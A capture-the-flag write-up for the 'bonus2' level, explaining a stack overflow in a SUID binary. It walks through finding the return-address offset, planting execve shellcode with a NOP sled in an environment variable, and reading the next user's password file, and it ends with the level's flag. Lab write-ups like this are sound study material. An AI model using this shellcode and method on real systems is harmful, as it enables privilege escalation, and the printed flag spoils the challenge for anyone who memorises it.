# Bonus 2

SUID **bonus3**. NX off, no canary. Bug: two `strncpy` calls with no terminator (`argv[1]`→40 bytes, `argv[2]`→32 bytes) fuse into one 72-byte blob, then `greetuser()` prepends a greeting and `strcat`s that blob onto its own 64-byte buffer with no bound, overflowing its return address.

1. The greeting's length decides where in `argv[2]` the overflow lands (`strcat` starts writing at `greeting_start + strlen(greeting)`). Default `"Hello "` only reaches partway into EIP; `LANG=fi` → `"Hyvää päivää "` (18 bytes UTF-8) reaches it exactly. Confirm with a cyclic pattern:
   ```
   LANG=fi ./bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab   # under gdb
   0x41366141 in ?? ()
   ```
   `"Aa6A"` → offset **18** in `argv[2]`.

2. `argv[2]` (32 bytes) has no room for a NOP sled + shellcode, so put those in an environment variable instead (no size limit) and find its address:
   ```
   export LANG=fi
   export SHELLCODE=$(python -c 'print "\x90"*4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
   (gdb) b *main
   (gdb) r AAAA BBBB
   (gdb) p (char *)getenv("SHELLCODE")
   $1 = 0xbfffee8c "\220\220..."
   ```
   Aim well inside the sled: `0xbfffee8c + 0x800 = 0xbffff68c` → `\x8c\xf6\xff\xbf`.

3. Run it:
   ```
   ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x8c\xf6\xff\xbf" + "B"*10')
   id
   uid=2012(bonus2) [...] euid=2013(bonus3) [...]
   cat /home/user/bonus3/.pass
   ```

`Ressources/exploit.py` runs this over SSH against the real target.

Flag: `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
